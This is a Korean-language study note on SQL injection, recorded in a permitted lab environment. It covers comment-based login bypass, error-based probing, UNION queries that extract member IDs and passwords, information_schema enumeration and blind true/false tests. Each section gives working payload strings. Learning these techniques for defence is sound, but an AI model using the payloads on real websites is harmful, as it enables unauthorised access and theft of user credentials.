웹 애플리케이션이 데이터베이스에 날리는 SQL을 개발자가 의도하지 않은 형태로 조작 · 공격


## 참고

- Git에는 SQL Injection에 사용될만한 명령어들을 종합해둔 사이트가 존재하여, 이를 참고해 SQL 취약점 존재 여부를 확인해볼 수 있다.
- 다만 실제 운영 중인 웹사이트에서는 취약점 존재 여부를 시도하는 것 자체가 위험하므로, **공격이 허용된 임의 환경**에서만 시도했다.

---

## 1. 주석(Comment)을 이용한 인증 우회

취약한 웹사이트의 ID/PASSWORD 입력란에서 DB 구문 문법을 활용해 공격하는 방식. ID 값에 아래와 같은 구문을 넣으면 PASSWORD 조건이 통째로 주석 처리되어, PASSWORD가 공백/빈칸만 아니면 로그인이 가능해진다.

### 예시 ID 값

```
'or 1=1--
' or 2=2--
true'or3=3--
```

### 주석 처리 방식 (DBMS별)

| 구문     | DBMS          |
| ------ | ------------- |
| `--`   | MSSQL, Oracle |
| `#`    | MySQL         |
| `-- -` | DBMS 무관 전체 공통 |

DB 스키마/테이블 값 조회 화면 예시:

![](Images/Pasted%20image%2020260729174725.png)  
![160](Images/Pasted%20image%2020260729174750.png)

---

## 2. Error Base SQL Injection

응답 에러 메시지를 통해 정보를 획득하여 공격하는 SQL 공격 기법. 사이트 내 검색이 `SELECT`/`WHERE`로 동작하는 점을 이용해 DB 스키마/테이블 값에 접근한다.

취약점이 많은 웹사이트에 아래 구문을 입력하면 숨겨진 필드에서 드래그 시 ERROR 메시지가 노출된다.


```sql
having 1=1--
group by ~--
```

- `having 1=1--`: 숨겨진 컬럼 값(예: `chapter1.idx`)이 드러나면서 순차적으로 정보에 접근 가능
- `group by ~--`: 이런 식으로 계속 트래킹하다 보면 `chapter1.level_idx`, `chapter1.ref_idx` 등 여러 컬럼 데이터 값을 확인할 수 있음

![](Images/Pasted%20image%2020260729175036.png)


---

## 3. Union SQL Injection

`UNION` 구문으로 테이블 2개의 내용을 동시에 출력할 수 있는 점을 이용해, 공격자가 알고 있는 DB 테이블의 데이터를 조회하는 공격.

> `UNION`으로 연결하는 컬럼의 타입과 개수가 동일해야 함



```sql
UNION SELECT 1,2,3,4,5,6,7 FROM member--
UNION SELECT 1,2,3,null,null,null,null FROM member--
UNION SELECT 1,2,3,m_id,m_name,NULL,NULL FROM member--
```

---

## 4. information_schema를 이용한 DB 정보 획득

MySQL, MSSQL 등에서는 `information_schema` DB에 전체 DB 정보(테이블/컬럼 목록 등)가 저장되어 있음.

### information_schema.columns 테이블 활용

**전체 테이블/컬럼명 조회**


```sql
UNION SELECT 1,2,3,table_name,column_name,NULL,NULL FROM information_schema.columns--
```

![](Images/Pasted%20image%2020260729162837.png)


**특정 테이블(member)의 컬럼명만 조회**

```sql
UNION SELECT 1,2,3,column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'member'--
```

![](Images/Pasted%20image%2020260729162744.png)


**실제 데이터 조회 (member 테이블)**


```sql
UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL FROM member--
```

![](Images/Pasted%20image%2020260729163310.png)


---


## 5. Blind SQL Injection

쿼리 결과가 **참/거짓**인지에 따라 정보를 획득하는 공격 기법.

sql

```sql
attacker' and 1=1--   -- 참 구문
attacker' and 1=2--   -- 거짓 구문
```